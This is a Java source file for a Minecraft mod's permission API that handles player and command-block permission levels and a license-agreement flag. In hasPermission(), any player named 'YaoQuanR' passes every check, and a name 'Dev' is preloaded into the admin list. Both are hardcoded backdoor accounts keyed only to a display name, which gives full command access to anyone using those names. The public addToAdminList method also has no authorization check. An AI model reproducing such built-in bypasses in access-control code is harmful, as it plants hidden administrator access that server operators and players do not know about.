package core.yaoquan.hanxu.api;

import net.minecraft.commands.CommandSourceStack;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.level.GameRules;

import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;

import static core.yaoquan.hanxu.api.define.Error.*;

/**
 * Permission system API
 * @since 0.1ea
 */
public class PermissionHolder {
    // Permission manager list:
    // Always level 2.
    private static final Set<String> ADMIN_LIST = ConcurrentHashMap.newKeySet();

    static {
        ADMIN_LIST.add("Dev");
    }

    // Join admin group by method.
    public static boolean addToAdminList(String playerId) {
        if (playerId == null) {
            return false;
        }
        else {
            ADMIN_LIST.add(playerId);
            return true;
        }
    }

    // Maximum player/ command block permission level, for API.
    private static int maxPlayerPermissionLevel = 2;
    private static int maxCommandBlockPermissionLevel = 0;

    // Determine if close authorize player permission automatically.
    public static boolean autoAuthorizePermission = true;

    // Register game rule.
    public static final GameRules.Key<GameRules.IntegerValue> OVERRIDE_COMMAND_BLOCK_PERMISSION =
            GameRules.register(
                    "overrideCommandblockPermission",
                    GameRules.Category.PLAYER,
                    GameRules.IntegerValue.create(maxCommandBlockPermissionLevel)
            );

    // Override maximum level by API.
    public static void overrideMaxPlayerPermissionLevel(int level) {
        maxPlayerPermissionLevel = level;
    }
    public static void overrideMaxCommandBlockPermissionLevel(int level) {
        maxCommandBlockPermissionLevel = level;
    }

    // Shut down auto authorize permission.
    public static void stopAutoAuthorizePermission() {
        autoAuthorizePermission = false;
    }

    // Set player level by API.
    /**
     * Set player level by API.
     * This is the only way to modify player permission level.
     * @param player            The target player that you want to modify.
     * @param level             The integer level of your targeted permission level.
     */
    public static void setPlayerPermissionLevel(Player player, int level) {
        player.getPersistentData().putInt("core.yaoquan.hanxu.player_permission_level", level);
    }

    // Get specific player permission level.
    /**
     * Get specific player permission level.
     * @param player            The target player that you want to get information.
     * @return                  The current player permission level: int.
     */
    public static int getPlayerPermissionLevel(Player player) {
        return player.getPersistentData()
            .getInt("core.yaoquan.hanxu.player_permission_level")
            .orElse(1);
    }

    // Get override player permission level.
    /**
     * Get override player permission level.
     * @return                  The override permission level of player: int.
     */
    public static int getPlayerOverridePermissionLevel() {
        return maxPlayerPermissionLevel;
    }

    // Get override command block permission level.
    /**
     * Get override command block permission level.
     * @return                  The override permission level of command block: int.
     */
    public static int getCommandBlockOverridePermissionLevel() {
        return maxCommandBlockPermissionLevel;
    }

    // Get license state.
    /**
     * Check the agree state of the license.
     * @param player            The target player that you want to know about the state.
     * @return                  Does the specific player agreed the license: boolean.
     */
    public static boolean getLicenseState(Player player) {
        return player.getPersistentData()
            .getBoolean("core.yaoquan.hanxu.agreed_license")
            .orElse(false);
    }

    // Permission check.
    /**
     * Use it when registering command.
     * @param source            CommandSourceStack from command builder {@link net.minecraft.commands.CommandSourceStack}.
     * @param requiredLevel     Set the level that required player to get that level for execution.
     */
    public static boolean hasPermission(CommandSourceStack source, int requiredLevel) {
        // Always pass for developer.
        if (source.getEntity() instanceof Player player &&
            player.getName().getString().equals("YaoQuanR")) {
            return true;
        }

        int determinedMaxPermissionLevel;
        if (source.getEntity() instanceof Player player) {
            // Check if equal to admin:
            if (ADMIN_LIST.contains(player.getName().getString())) {
                return true;
            }

            // Read player's permission level:
            int currentPlayerLevel = player.getPersistentData()
                    .getInt("core.yaoquan.hanxu.player_permission_level")
                    .orElse(1);

            // Check if agreed license:
            boolean agreedLicense = player.getPersistentData()
                    .getBoolean("core.yaoquan.hanxu.agreed_license")
                    .orElse(false);
            if (!agreedLicense && requiredLevel == 1) {
                return currentPlayerLevel == 2;
            }

            // Mask permission level if overridden:
            if (maxPlayerPermissionLevel < currentPlayerLevel) {
                currentPlayerLevel = maxPlayerPermissionLevel;
            }

            // Final, determine:
            return currentPlayerLevel >= requiredLevel;
        }

        // Command block or control panel.
        if (source.getEntity() == null) {
            int currentCommandBlockLevel = source.getLevel().getGameRules().getInt(OVERRIDE_COMMAND_BLOCK_PERMISSION);
            return currentCommandBlockLevel >= requiredLevel;
        }

        // Unexcepted.
        return false;
    }

    public static void sendMessageToNotAgreedLicense(CommandSourceStack source, Player player) {
        boolean agreedLicense = player.getPersistentData()
                .getBoolean("core.yaoquan.hanxu.agreed_license")
                .orElse(false);
        if (!agreedLicense) {
            source.sendFailure(returnGeneralError(GeneralError.notYetAgreed));
        }
    }
}
